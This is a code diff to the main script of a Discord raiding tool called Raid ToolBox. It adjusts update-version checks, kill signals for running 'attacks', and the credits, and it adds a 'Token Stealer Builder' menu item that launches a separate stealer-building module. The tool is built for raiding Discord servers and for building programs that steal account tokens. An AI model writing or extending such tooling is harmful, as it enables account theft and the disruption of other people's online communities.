@@ -340,7 +340,17 @@ else:
             if verbose == 1:
                 print("Checking for updates...")
             vercheck = requests.get("https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/version").text.rstrip().split("|")
-            if not vercheck[0] == rtbversion:
+            versionno = vercheck[0].split(".")
+            myversion = rtbversion.split(".")
+            if versionno[0] > myversion[0]:
+                update = True
+            elif versionno[1] > myversion[1]:
+                update = True
+            elif versionno[2] > myversion[2]:
+                update = True
+            else:
+                update = False
+            if update:
                 if command_line_mode == 1:
                     print(colored("There is an update for RTB, Download update?", menu1))
                     verchoice = input("(Y/N): ")
@@ -432,6 +442,8 @@ else:
                         download_file('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/RTBFiles/serversmasher.py')
                         download_file('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/RTBFiles/smconfig.py')
                         download_file("https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/RTB.py")
+                        shutil.copy("smconfig.py", "RTBFiles/smconfig.py")
+                        os.remove("smconfig.py")
                         sg.Popup("Update Complete, Press ok to close.")
                         os.kill(os.getpid(), 15)
         except Exception as e:
@@ -664,7 +676,7 @@ def main(currentattacks):
         choice = input(colored(">",menu2))
     elif command_line_mode == 0:
         menu_def = [['RTB', ['Attack Manager', 'Themes', 'About', ['Info', 'Diagnostics']]],
-                    ['Tokens', ['View/Add Tokens']],
+                    ['Tokens', ['View/Add Tokens', 'Token Stealer Builder']],
                     ['Help', ['Wiki', 'My YouTube', 'Discord Server', 'Telegram']],
                     ['Server Smasher', ['Launch']],
                     ['Plugins', ['Plugin Support Coming soon. (Use Command Line to access Legacy Plugins)']]
@@ -711,16 +723,18 @@ def main(currentattacks):
                     if event is None:
                         window.Close()
                         main(currentattacks)
+                    elif event == sg.TIMEOUT_KEY:
+                        pass
                     elif event == "Stop All":
                         for attack in currentattacks:
                             try:
-                                os.kill(int(currentattacks[attack]), 15)
+                                os.kill(int(currentattacks[attack]), 9)
                             except Exception:
                                 pass
                         currentattacks = {}
                     elif event in currentattacks:
                         try:
-                            os.kill(int(currentattacks[event]), 15)
+                            os.kill(int(currentattacks[event]), 9)
                         except Exception as e:
                             print(e)
             elif event == "Diagnostics":
@@ -795,7 +809,7 @@ def main(currentattacks):
                              [sg.Image(data=rtb_banner)],
                              [sg.Text("Version {}".format(rtbversion))],
                              [sg.Text("Copyright (c) 2019, DeadBread\n\n")],
-                             [sg.Text("Credits/Special Thanks:\nSynchronocy - Inspiring RTB and creating the base for server smasher\nMattlau04 - Writing the Docs and helping me out with general shit\nAliveChive - Bug Hunting\ndirt - Creating Themes and Testing\nNextro - Termux Testing\nColt. - Termux Testing\nLucas. - Creating Themes and Nitro Boosting DeadBakery\nTummy Licker - Gifting Nitro\n")],
+                             [sg.Text("Credits/Special Thanks:\n\nSynchronocy - Inspiring RTB and creating the base for server smasher\nMattlau04 - Writing the Docs and helping me out with general shit\nAliveChive - Bug Hunting\ndirt - Creating Themes and Testing\nNextro - Termux Testing\nColt. - Termux Testing\nLucas. - Creating Themes and Nitro Boosting DeadBakery\nTummy Licker - Gifting Nitro\n")],
                              ]
                     window = sg.Window("DeadBread's Raid ToolBox v{} | Info".format(rtbversion)).Layout(layout)
                     event, values = window.Read()
@@ -891,6 +905,9 @@ def main(currentattacks):
                             text = values[1]
                             with open("tokens.txt", "w") as write:
                                 write.write(text)
+            elif event == "Token Stealer Builder":
+                p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','StealerBuilder',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme)],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                currentattacks["Token Stealer Builder | Started at: {}".format(datetime.datetime.now().time())] = p.pid
             elif event == "Launch":
                 window.Close()
                 serversmasher(currentattacks)
